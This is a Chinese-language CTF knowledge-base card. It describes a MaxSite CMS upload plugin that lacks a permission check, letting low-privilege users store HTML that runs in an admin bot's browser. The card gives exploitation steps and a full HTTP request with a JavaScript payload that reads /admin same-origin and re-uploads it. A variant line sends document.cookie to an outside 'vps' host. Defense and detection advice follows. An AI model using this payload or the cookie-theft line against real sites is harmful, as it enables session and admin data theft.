---
id: web-generic-xss-maxsite-upload-missing-authz-admin-page-exfil
title: MaxSite CMS 上传插件缺权限校验：低权限用户上传 HTML 同源读取管理员页面
type: scenario
domain: web
path: web/generic/xss
technique: maxsite-upload-missing-authz-stored-xss-admin-exfil
tags:
- xss
- stored-xss
- php
- maxsite
- broken-access-control
- file-upload
- admin-bot
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V125
  verified_at: '2026-11-06T04:11:28+08:00'
  notes: 已对照原文截图核对：uploads-require-maxsite.php 仅 is_login() 缺 mso_check_allow、X-Requested-FileUpDir/FileUpDir 上传到 uploads/_pages/{page_id}/、同源 fetch('/admin') 后二次上传 admin_content.html 并读到 flag 均一致；未实际运行 PoC。
url: /docs/web/generic/xss/web-generic-xss-maxsite-upload-missing-authz-admin-page-exfil/
draft: false
kb_aliases:
- N-MinSite
- MaxSite CMS
- uploads-require-maxsite.php
- admin_page 插件
- 低权限上传
- 同源 fetch 管理员页面
---

## 一句话结论

MaxSite CMS 的 `uploads-require-maxsite.php` 只校验 `is_login()`、缺少 `mso_check_allow('admin_page_edit')`，低权限用户也能把 HTML 上传到 `/pages` 静态目录；管理员 bot 访问该页面后，脚本用同源 `fetch('/admin', {credentials:'include'})` 读取后台页面并再次上传到公开路径，从而泄露 flag。

## 原理

- **越权点**：上传插件开头只有 `if (!is_login()) die('no login');`，没有检查 `admin_page_edit` 权限；低权限用户组（`users_groups_id=2`）登录后即可调用。
- **上传路径**：`$page_id = $_SERVER['HTTP_X_REQUESTED_FILEUPDIR']`（必须是数字），`$up_dir = getinfo('uploads_dir') . '_pages/' . $page_id . '/'`；`_upload` 里 `$fn = _slug($fn)` 保留 `.html` 扩展名，`file_put_contents($up_dir.$fn, file_get_contents('php://input'))` 直接写原始请求体，无内容过滤。
- **静态渲染**：上传目录映射到站点的 `/pages`，HTML 文件按 `text/html` 返回；管理员 bot 会定期访问 `/pages` 下的页面，脚本在管理员浏览器中同源执行。
- **同源读取**：即使会话 Cookie 是 HttpOnly、JS 读不到 `document.cookie`，同源 `fetch('/admin', {credentials:'include'})` 仍会带上 Cookie 并返回后台 HTML；脚本把响应内容通过同一个上传接口写成 `admin_content.html`，攻击者再访问该公开页面即可读到 flag。
- **为什么先试 cookie 外带会失败**：把 `document.cookie` POST 到外部 VPS 可能受 HttpOnly、CORS、会话 IP 绑定影响；同源 fetch 在管理员浏览器内完成，不依赖攻击者复用 Cookie。
- **前置入口**：上传插件本身不能直接访问（`BASEPATH` 保护），要通过 `POST /require-maxsite/<base64路径>` 的受控 include 路由调用；Base64 解码后是 `admin/plugins/admin_page/uploads-require-maxsite.php`。

## 触发条件

- MaxSite CMS 启用了 `admin_page` 插件与 `require-maxsite` 路由。
- 攻击者拥有一个低权限账号（能登录，但无 `admin_page_edit` 权限）。
- 上传接口只校验登录、不校验权限；`X-Requested-FileUpDir` 可控且目录可写。
- 管理员 bot 会访问 `/pages` 下的 HTML；上传目录与主站同源且按 HTML 解析。

## 利用步骤

1. 获取低权限账号并登录，拿到 `ci_session` Cookie。
2. 把 `admin/plugins/admin_page/uploads-require-maxsite.php` 做 Base64，拼成 `POST /require-maxsite/<b64>`。
3. 发送上传请求：`X-Requested-Filename: probe.html`、`X-Requested-FileUpDir: 1`、`X-Requested-ReplaceFile: true`、`Content-Type: application/octet-stream`，body 为 HTML/JS。
4. 访问 `/pages/probe.html` 确认上传成功且脚本可执行。
5. 把脚本改为同源读取后台并二次上传：
   `fetch('/admin',{credentials:'include'}).then(r=>r.text()).then(t=>fetch(uploadUrl,{method:'POST',credentials:'include',headers:{...},body:t}))`。
6. 等待管理员 bot 访问；随后访问 `/pages/admin_content.html` 读取后台页面/flag。

## PoC

上传请求：

```http
POST /require-maxsite/YWRtaW4vcGx1Z2lucy9hZG1pbl9wYWdlL3VwbG9hZHMtcmVxdWlyZS1tYXhzaXRlLnBocA== HTTP/1.1
Host: target
Cookie: ci_session=...
X-Requested-Filename: probe.html
X-Requested-FileUpDir: 1
X-Requested-ReplaceFile: true
Content-Type: application/octet-stream

<script>
(async () => {
  const uploadUrl = '/require-maxsite/YWRtaW4vcGx1Z2lucy9hZG1pbl9wYWdlL3VwbG9hZHMtcmVxdWlyZS1tYXhzaXRlLnBocA==';
  const resp = await fetch('/admin', { credentials: 'include' });
  const content = await resp.text();
  await fetch(uploadUrl, {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/octet-stream',
      'X-Requested-Filename': 'admin_content.html',
      'X-Requested-FileUpDir': '1',
      'X-Requested-ReplaceFile': 'true'
    },
    body: content
  });
})();
</script>
```

## 变体与关联

- **外带变体**：若 Cookie 非 HttpOnly 且无 IP 绑定，可直接 `fetch('http://vps/?c='+document.cookie)`；否则用同源 fetch + 二次上传。
- **上传变体**：`.html`、`.htm`、`.svg`、`.xhtml`；若只允许图片，可尝试 SVG/HTML polyglot 或 MIME 混淆。
- **权限变体**：其他只做 `is_login()` 的插件接口；任何缺失 `mso_check_allow` 的 admin_page 操作都可越权。
- **关联卡片**：[[web-generic-file-upload-html-static-stored-xss]]（上传 HTML 到静态目录的通用原语）、[[web-php-maxsite-require-route-base64-include-key-leak]]（同题入口与源码泄露）、[[web-generic-auth-multi-session-matrix-leakscore]]（越权检测）、[[web-generic-xss-admin-blind-stored-registration]]（后台盲打 XSS）。
- **边界**：若上传目录与主站不同源、强制 `Content-Disposition: attachment`/`nosniff`、或管理员不访问页面，链不成立；HttpOnly Cookie 只阻止 JS 读取，不阻止同源 fetch 携带。

## 检测与防御

- **权限**：上传/编辑接口必须同时校验登录与 `mso_check_allow('admin_page_edit')`；按角色做服务端授权，不能只靠前端隐藏菜单。
- **上传**：扩展名白名单 + 魔数校验 + 图片重编码；上传目录放独立域名/对象存储，禁止 HTML 解析；响应加 `Content-Disposition: attachment`、`X-Content-Type-Options: nosniff`、严格 CSP。
- **会话**：Cookie 设 `HttpOnly`、`Secure`、`SameSite`；后台操作加 CSRF token。
- **检测信号**：低权限账号调用 admin_page 上传接口；`/pages` 下出现 `.html` 文件；管理员访问后短时间内同一上传接口被再次调用并写入 `admin_content.html`。
